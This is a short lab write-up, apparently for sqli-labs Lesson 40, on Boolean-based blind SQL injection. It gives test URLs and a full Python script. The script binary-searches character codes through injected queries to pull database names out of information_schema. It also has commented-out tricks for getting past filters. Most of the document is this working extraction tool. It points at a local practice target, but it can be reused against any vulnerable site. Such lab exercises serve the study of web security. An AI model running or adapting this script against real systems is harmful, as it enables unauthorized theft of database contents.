# Lesson-40
```
Bool盲注
```

盲注
```
http://127.0.0.1/Less-40/?id=0'or(1)or ''='1
http://127.0.0.1/Less-40/?id=0'or(0)or ''='1
```
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "0'or("
	endStr = ")or ''='1"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = startStr + payload + endStr
	# temper
	# payload = payload.replace(" ","/**/")
	# payload = payload.replace("or","oorr")
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-40/?id="
	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)
	# print tempurl
	content = requests.get(tempurl).text
	# print content
	# content-end
	# judge-start
	if "Your Username is :" in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
